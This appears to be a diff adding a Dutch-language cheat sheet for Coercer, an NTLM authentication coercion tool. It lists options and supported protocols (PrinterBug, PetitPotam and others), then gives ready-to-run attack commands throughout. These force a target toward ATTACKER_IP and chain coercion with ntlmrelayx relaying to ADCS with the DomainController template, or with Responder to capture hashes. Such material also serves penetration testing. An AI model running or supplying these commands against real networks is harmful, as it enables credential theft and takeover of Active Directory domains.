@@ -1,0 +1,60 @@
+# Coercer — Multi-protocol NTLM authenticatie coercion
+# Test en trigger NTLM coercion via meerdere Windows RPC protocols tegelijk
+#
+# === Syntax ===
+# python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET
+#
+# === Belangrijkste opties ===
+# -u USER                     Gebruikersnaam
+# -p PASS                     Wachtwoord
+# -d DOMAIN                   Domeinnaam
+# -l ATTACKER_IP              Listener IP (waar authenticatie naartoe gaat)
+# -t TARGET                   Doelwit server
+# --always-continue           Ga door na eerste succesvolle coercion
+# --filter-protocol-name NAME Filter op specifiek protocol
+# --filter-pipe-name PIPE     Filter op named pipe
+# --unauthenticated           Probeer zonder credentials
+# --listener-type http/smb    Type listener (default: smb)
+#
+# === Ondersteunde protocols ===
+# MS-RPRN      Print Spooler (PrinterBug/Dementor)
+# MS-EFSRPC    Encrypting File System (PetitPotam)
+# MS-FSRVP     File Server VSS Agent
+# MS-DFSNM     DFS Namespace Management
+# MS-EVEN      EventLog Remoting
+# MS-EFSR      EFS (variant)
+#
+# === Voorbeelden ===
+
+# === Scan alle protocols ===
+python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET
+
+# === Scan en ga door na succes ===
+python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET --always-continue
+
+# === Filter op specifiek protocol ===
+python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET --filter-protocol-name MS-EFSRPC
+
+# === Unauthenticated poging ===
+python3 Coercer.py --unauthenticated -l ATTACKER_IP -t TARGET
+
+# === Scan mode (alleen testen, niet triggeren) ===
+python3 Coercer.py scan -u USER -p PASS -d DOMAIN -t TARGET
+
+# === Combinatie met ntlmrelayx (ADCS relay) ===
+# 1. Start relay naar ADCS
+impacket-ntlmrelayx -t http://ADCS_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# 2. Trigger coercion via alle protocols
+python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t DC
+
+# === Combinatie met Responder (hash vangen) ===
+# 1. Start Responder
+responder -I eth0
+
+# 2. Trigger coercion
+python3 Coercer.py -u USER -p PASS -d DOMAIN -l ATTACKER_IP -t TARGET
+
+# Noot: Coercer combineert PetitPotam, PrinterBug en meer in een tool
+# Noot: Handiger dan individuele tools als je niet weet welk protocol werkt
+# Noot: Gebruik --always-continue om alle werkende methodes te vinden
